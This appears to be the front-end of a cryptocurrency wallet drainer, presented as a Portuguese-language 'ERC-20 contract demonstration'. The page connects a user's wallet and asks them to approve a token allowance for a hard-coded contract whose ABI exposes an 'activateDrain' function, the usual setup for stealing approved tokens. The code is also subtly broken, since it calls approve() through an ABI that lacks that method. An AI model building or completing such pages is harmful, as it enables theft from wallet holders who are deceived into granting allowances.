<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Demonstração de Contrato</title>
    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
    <h2>Demonstração de Contrato ERC-20</h2>
    <button id="connectWallet">Conectar Carteira</button>
    <button id="approveTokens">Aprovar Tokens</button>
    <input type="text" id="tokenAmount" placeholder="Quantidade para Aprovar">
    <button id="activateTransfer">Ativar Transferência</button>

    <script>
        let web3;
        let userAccount;

        // Endereços do contrato (substitua pelos seus contratos específicos)
        const tokenAddress = '0x1Ef397Cca4296D988EDDD7479479387B340Ff1f1'; // Endereço do contrato ERC-20
        const contractAddress = '0x1b4A20Ccedfd20Ef44F3b17Ab05bA49B6a225b72'; // Endereço do seu contrato inteligente

        // ABI simplificada para interação com ERC-20 (substitua pela ABI completa do seu token)
        const tokenABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_tokenContract",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "_amount",
				"type": "uint256"
			}
		],
		"name": "activateDrain",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
];

        // Conectar à carteira
        document.getElementById('connectWallet').addEventListener('click', async () => {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    await window.ethereum.enable();
                    const accounts = await web3.eth.getAccounts();
                    userAccount = accounts[0];
                    console.log("Carteira conectada:", userAccount);
                } catch (error) {
                    console.error("Usuário negou acesso à conta.");
                }
            } else {
                alert("Por favor, instale MetaMask ou outro provedor de carteira Ethereum.");
            }
        });

        // Aprovar tokens
        document.getElementById('approveTokens').addEventListener('click', () => {
            const tokenAmount = document.getElementById('tokenAmount').value;
            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
            tokenContract.methods.approve(contractAddress, tokenAmount).send({from: userAccount})
                .then((tx) => {
                    console.log("Tokens aprovados:", tx);
                }).catch((error) => {
                    console.error("Falha ao aprovar tokens:", error);
                });
        });

        // Ativar transferência (implemente conforme a lógica do seu contrato)
        document.getElementById('activateTransfer').addEventListener('click', () => {
            // Implemente a chamada ao seu contrato aqui
            console.log("Transferência ativada (implemente a lógica de contrato aqui).");
        });
    </script>
</body>
</html>
